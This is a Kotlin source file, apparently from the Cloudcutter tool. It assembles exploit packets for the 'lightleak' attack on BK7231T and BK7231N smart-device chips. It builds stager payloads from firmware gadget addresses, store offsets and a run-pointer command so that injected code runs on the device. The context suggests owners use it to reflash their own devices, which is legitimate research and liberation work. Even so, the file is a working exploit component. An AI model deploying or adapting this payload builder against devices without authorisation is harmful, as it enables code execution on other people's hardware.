/*
 * Copyright (c) Kuba Szczodrzyński 2022-9-26.
 */

package io.github.cloudcutter.work.protocol.proper

import io.github.cloudcutter.data.model.ProfileLightleak
import io.github.cloudcutter.data.model.ProfileLightleakDataN
import io.github.cloudcutter.data.model.ProfileLightleakDataT
import io.github.cloudcutter.work.protocol.base.BasePacket
import io.github.cloudcutter.work.protocol.buildByteArray
import java.net.InetAddress
import io.github.cloudcutter.work.protocol.stager.bk7231n.StagerPacket as StagerPacketN
import io.github.cloudcutter.work.protocol.stager.bk7231t.StagerPacket as StagerPacketT

abstract class ProperPacket(
	val profile: ProfileLightleak.Data,
	val requestId: Int,
	var returnIp: InetAddress = InetAddress.getByName("255.255.255.255"),
) : BasePacket() {

	abstract val action: Int
	abstract val properData: ByteArray

	private val stager: BasePacket by lazy {
		when (profile) {
			is ProfileLightleakDataT -> buildTPacket(profile)
			is ProfileLightleakDataN -> buildNPacket(profile)
			else -> throw IllegalArgumentException("Invalid profile data type")
		}
	}

	override fun getJsonFields() = stager.getJsonFields()
	override fun getCommand() = stager.getCommand()
	override fun getOptions() = stager.getOptions()

	private fun getProperCommand(bufferAddr: Int) = buildByteArray(
		size = 12 + properData.size,
		/* 0x00 (u32) request_id= */
		requestId,
		/* 0x04 (u32) return_ip= */
		returnIp.address.reversedArray(),
		/* 0x0C (u8*) buf= */
		bufferAddr,
		/* 0x10+ (void*) data= */
		properData,
	)

	private fun buildTPacket(profile: ProfileLightleakDataT) =
		object : StagerPacketT(profile) {
			override val storeAddress = profile.getGadget("proper").getStoreOffset(profile)

			override fun getCommand() = buildByteArray(
				size = 12 + 12 + properData.size,
				/* 0x48 (u32) cmd= */
				CMD_RUN_PTR,
				/* 0x4C (FW_INTERFACE*) intf= */
				profile.addressMap.intf,
				/* 0x50 (u32) command= */
				action,
				/* 0x54 (u8*) data= */
				getProperCommand(profile.addressMap.buffer),
			)
		}

	private fun buildNPacket(profile: ProfileLightleakDataN) =
		object : StagerPacketN(profile) {
			override val target = profile.getGadget("proper")

			override fun getCommand() = buildByteArray(
				size = 8 + 12 + properData.size,
				/* 0x48 (FW_INTERFACE*) intf= */
				profile.addressMap.intf,
				/* 0x4C (u32) command= */
				action,
				/* 0x50 (u8*) data= */
				getProperCommand(profile.addressMap.buffer),
			)
		}
}
